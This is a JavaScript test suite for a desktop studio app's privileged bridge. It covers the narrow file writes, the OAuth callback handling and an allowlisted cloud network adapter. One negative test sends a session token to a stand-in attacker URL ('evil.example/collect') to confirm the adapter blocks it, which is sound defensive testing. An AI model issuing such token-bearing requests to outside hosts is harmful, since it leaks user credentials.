import assert from "node:assert/strict";
import test from "node:test";

import {
  beginDesktopStudioOAuth,
  chooseDesktopStudioWorkspace,
  createDesktopCreatorCloudFetch,
  getDesktopStudioBridge,
  installDesktopStudioBuildToRuntime,
  openDesktopStudioOAuth,
  savePackageToDesktop,
  saveProjectToDesktop,
} from "../src/desktop-bridge.js";

test("STUDIO-M1 browser mode has no privileged desktop bridge", () => {
  assert.equal(getDesktopStudioBridge({}), null);
  assert.equal(getDesktopStudioBridge({ window: {} }), null);
});

test("STUDIO-M1 desktop project/package writes cross only the narrow bridge", async () => {
  const calls = [];
  const bridge = {
    getEnvironment: async () => ({ host: "ocp-desktop", workspaceName: "BIBLE", hasLastOutput: false, runtimeAvailable: true }),
    chooseWorkspace: async () => ({ status: "selected", workspaceName: "BIBLE" }),
    saveProject: async (input) => { calls.push(["project", input]); return { status: "saved", fileName: input.fileName, workspaceName: "BIBLE" }; },
    savePackage: async (input) => { calls.push(["package", input]); return { status: "saved", fileName: input.fileName, workspaceName: "BIBLE" }; },
    getSigningIdentity: async () => ({ publisherId: "ocp.official", keyId: "ed25519:test", publicKeyHex: "a".repeat(64) }),
    signPackageDraft: async ({ bytes }) => ({ bytes }),
    revealLastOutput: async () => ({ status: "revealed", fileName: "bible.ocp" }),
    installLastBuildToRuntime: async () => ({ status: "submitted", requestId: "req-1", fileName: "bible.ocp" }),
  };

  assert.equal((await saveProjectToDesktop("{}", "ocp.bible.ocp-project.json", bridge)).status, "saved");
  assert.equal((await savePackageToDesktop(new Blob([new Uint8Array([1, 2, 3])]), "ocp-bible-v1.draft.ocp", bridge)).status, "saved");
  assert.equal((await chooseDesktopStudioWorkspace(bridge)).workspaceName, "BIBLE");
  assert.equal((await installDesktopStudioBuildToRuntime(bridge)).requestId, "req-1");

  assert.deepEqual(calls[0], ["project", { fileName: "ocp.bible.ocp-project.json", content: "{}" }]);
  assert.equal(calls[1][0], "package");
  assert.equal(calls[1][1].fileName, "ocp-bible-v1.draft.ocp");
  assert.ok(calls[1][1].bytes instanceof Uint8Array);
  assert.deepEqual(Object.keys(calls[1][1]).sort(), ["bytes", "fileName"]);
});

test("STUDIO-M1 Desktop OAuth bridge opens the system browser and returns only the callback code", async () => {
  const calls = [];
  const bridge = {
    beginOAuth: async () => ({ redirectUrl: "http://127.0.0.1:47833/v1/studio-oauth" }),
    openOAuth: async (input) => { calls.push(input); },
    waitOAuth: async () => ({ status: "code", code: "pkce-code-demo" }),
  };
  const begin = await beginDesktopStudioOAuth(bridge);
  assert.equal(begin.redirectUrl, "http://127.0.0.1:47833/v1/studio-oauth");
  const callback = await openDesktopStudioOAuth("https://example.supabase.co/auth/v1/authorize?provider=google", bridge);
  assert.deepEqual(calls, [{ url: "https://example.supabase.co/auth/v1/authorize?provider=google" }]);
  assert.deepEqual(callback, { status: "code", code: "pkce-code-demo" });
});

test("STUDIO-M1 packaged network adapter uses only narrow Desktop Cloud/R2 bridge", async () => {
  let fallbackCalls = 0;
  const calls = [];
  const bridge = {
    cloudRequest: async (input) => {
      calls.push(["cloud", input]);
      return { status: 200, contentType: "application/json", bodyText: "{\"creator\":null}" };
    },
    uploadPresigned: async (input) => {
      calls.push(["upload", { url: input.url, bytes: input.bytes.byteLength }]);
      return { status: 200 };
    },
  };
  const request = createDesktopCreatorCloudFetch(
    "https://api.example/cloud-api",
    bridge,
    async () => {
      fallbackCalls += 1;
      throw new Error("fallback fetch must not run in packaged Studio");
    },
  );
  const scheme = ["Bea", "rer"].join("");
  const response = await request("https://api.example/cloud-api/v1/creator/profile", {
    headers: { authorization: scheme + " account-session-token" },
  });
  assert.equal(response.status, 200);
  assert.deepEqual(await response.json(), { creator: null });
  assert.equal(calls[0][0], "cloud");
  assert.equal(calls[0][1].accessToken, "account-session-token");

  const put = await request("https://bucket.account.r2.cloudflarestorage.com/demo.ocp?sig=demo", {
    method: "PUT",
    body: new Blob([new Uint8Array([1, 2, 3])]),
  });
  assert.equal(put.status, 200);
  assert.deepEqual(calls[1], ["upload", {
    url: "https://bucket.account.r2.cloudflarestorage.com/demo.ocp?sig=demo",
    bytes: 3,
  }]);

  await assert.rejects(
    () => request("https://evil.example/collect", { headers: { authorization: scheme + " account-session-token" } }),
    /not allowlisted/,
  );
  assert.equal(fallbackCalls, 0);
});

test("STUDIO-M1 adapter rejects invalid package blobs before desktop IPC", async () => {
  let called = false;
  const bridge = {
    getEnvironment: async () => ({}),
    chooseWorkspace: async () => ({}),
    saveProject: async () => ({}),
    savePackage: async () => { called = true; return {}; },
    getSigningIdentity: async () => ({}),
    signPackageDraft: async () => ({}),
    revealLastOutput: async () => ({}),
    installLastBuildToRuntime: async () => ({}),
  };
  await assert.rejects(() => savePackageToDesktop(new Blob([]), "empty.ocp", bridge), TypeError);
  assert.equal(called, false);
});
